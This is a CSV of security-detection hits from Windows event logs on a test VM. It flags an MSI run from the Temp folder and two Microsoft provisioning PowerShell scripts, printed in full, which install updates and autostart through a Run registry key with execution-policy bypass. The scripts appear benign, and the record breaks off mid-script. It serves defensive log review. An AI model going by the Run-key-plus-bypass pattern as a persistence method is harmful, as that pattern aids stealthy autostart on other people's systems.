"Timestamp","RuleTitle","Level","Computer","Channel","EventID","RecordID","Details","ExtraFieldInfo","RuleID"
"2019-03-19 14:24:26.665 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1040,332,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 6468 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:24:27.227 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1042,335,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 6468 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:25:14.946 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1040,394,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 2988 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:25:15.774 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1042,397,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 2988 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:25:16.055 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1040,400,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 1836 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:25:16.602 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1042,403,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 1836 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:25:26.290 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1040,406,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 7588 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:25:27.071 +01:00","MSI Installation From Suspicious Locations","med","MSEDGEWIN10","App",1042,409,"Data[1]: C:\Windows\Temp\7z920.msi ¦ Data[2]: 7588 ¦ Data[3]: (NULL) ¦ Data[4]: (NULL) ¦ Data[5]: (NULL) ¦ Data[6]: (NULL) ¦ Data[7]:","-","96acd930-342e-66ca-9855-1285ba8a40ed"
"2019-03-19 14:00:52.303 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,13,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param ( [Int]$IEBlocker = 0, [String]$IESetupUrl = """" ) # Install updates on the next restart $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $UpdateScriptPath = ""a:\win-updates.ps1"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -File $($UpdateScriptPath)"" # Set IEBlocker Registry Key [System.Reflection.Assembly]::LoadWithPartialName(""System.Web.Extensions"") $json = Get-Content ""A:\build.cfg"" $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer $config = $ser.DeserializeObject($json) $build = $config.build $windows = $config.windows $ie = $config.ie $ieNumber = $ie.Substring(2) $IEBlocker = [int]$IENumber + 1 # Change Computer Name #Rename-Computer -NewName ""$ie$windows"" $IEBlocker8Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\8.0"" $IEBlocker8Value = ""DoNotAllowIE80"" $IEBlocker9Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\9.0"" $IEBlocker9Value = ""DoNotAllowIE90"" $IEBlocker10Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\10.0"" $IEBlocker10Value = ""DoNotAllowIE10"" $IEBlocker11Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\11.0"" $IEBlocker11Value = ""DoNotAllowIE11"" switch ($IEBlocker) { 7 { Write-Output ""Blocking IE7-IE11"" New-Item -Path $IEBlocker7Key -Force New-ItemProperty -Path $IEBlocker7Key -Name $IEBlocker7Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker8Key -Force New-ItemProperty -Path $IEBlocker8Key -Name $IEBlocker8Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker9Key -Force New-ItemProperty -Path $IEBlocker9Key -Name $IEBlocker9Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 8 { Write-Output ""Blocking IE8-IE11"" New-Item -Path $IEBlocker8Key -Force New-ItemProperty -Path $IEBlocker8Key -Name $IEBlocker8Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker9Key -Force New-ItemProperty -Path $IEBlocker9Key -Name $IEBlocker9Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 9 { Write-Output ""Blocking IE9-IE11"" New-Item -Path $IEBlocker9Key -Force New-ItemProperty -Path $IEBlocker9Key -Name $IEBlocker9Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 10 { Write-Output ""Blocking IE10-IE11"" New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 11 { Write-Output ""Blocking IE11"" New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 0 { Write-Output ""IE Blocker not installed"" } } # Copy EULA to system32 Copy-Item A:\eula.txt C:\Windows\System32 # Create EULA Shortcut $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(""$Home\Desktop\eula.lnk"") $Shortcut.TargetPath = ""C:\windows\system32\eula.txt"" $Shortcut.Save() Restart-Computer -Force","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\preprovisioner.ps1 ¦ ScriptBlockId: 545d88ea-25f0-458b-8c53-e57aee37ec61 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param ( [Int]$IEBlocker = 0, [String]$IESetupUrl = """" ) # Install updates on the next restart $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $UpdateScriptPath = ""a:\win-updates.ps1"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -File $($UpdateScriptPath)"" # Set IEBlocker Registry Key [System.Reflection.Assembly]::LoadWithPartialName(""System.Web.Extensions"") $json = Get-Content ""A:\build.cfg"" $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer $config = $ser.DeserializeObject($json) $build = $config.build $windows = $config.windows $ie = $config.ie $ieNumber = $ie.Substring(2) $IEBlocker = [int]$IENumber + 1 # Change Computer Name #Rename-Computer -NewName ""$ie$windows"" $IEBlocker8Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\8.0"" $IEBlocker8Value = ""DoNotAllowIE80"" $IEBlocker9Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\9.0"" $IEBlocker9Value = ""DoNotAllowIE90"" $IEBlocker10Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\10.0"" $IEBlocker10Value = ""DoNotAllowIE10"" $IEBlocker11Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Setup\11.0"" $IEBlocker11Value = ""DoNotAllowIE11"" switch ($IEBlocker) { 7 { Write-Output ""Blocking IE7-IE11"" New-Item -Path $IEBlocker7Key -Force New-ItemProperty -Path $IEBlocker7Key -Name $IEBlocker7Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker8Key -Force New-ItemProperty -Path $IEBlocker8Key -Name $IEBlocker8Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker9Key -Force New-ItemProperty -Path $IEBlocker9Key -Name $IEBlocker9Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 8 { Write-Output ""Blocking IE8-IE11"" New-Item -Path $IEBlocker8Key -Force New-ItemProperty -Path $IEBlocker8Key -Name $IEBlocker8Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker9Key -Force New-ItemProperty -Path $IEBlocker9Key -Name $IEBlocker9Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 9 { Write-Output ""Blocking IE9-IE11"" New-Item -Path $IEBlocker9Key -Force New-ItemProperty -Path $IEBlocker9Key -Name $IEBlocker9Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 10 { Write-Output ""Blocking IE10-IE11"" New-Item -Path $IEBlocker10Key -Force New-ItemProperty -Path $IEBlocker10Key -Name $IEBlocker10Value -PropertyType DWord -Value 1 -Force New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 11 { Write-Output ""Blocking IE11"" New-Item -Path $IEBlocker11Key -Force New-ItemProperty -Path $IEBlocker11Key -Name $IEBlocker11Value -PropertyType DWord -Value 1 -Force } 0 { Write-Output ""IE Blocker not installed"" } } # Copy EULA to system32 Copy-Item A:\eula.txt C:\Windows\System32 # Create EULA Shortcut $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(""$Home\Desktop\eula.lnk"") $Shortcut.TargetPath = ""C:\windows\system32\eula.txt"" $Shortcut.Save() Restart-Computer -Force","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:01:39.099 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,17,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: ac12cd97-3fa8-4846-a6aa-e4bfe1adb22f ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was 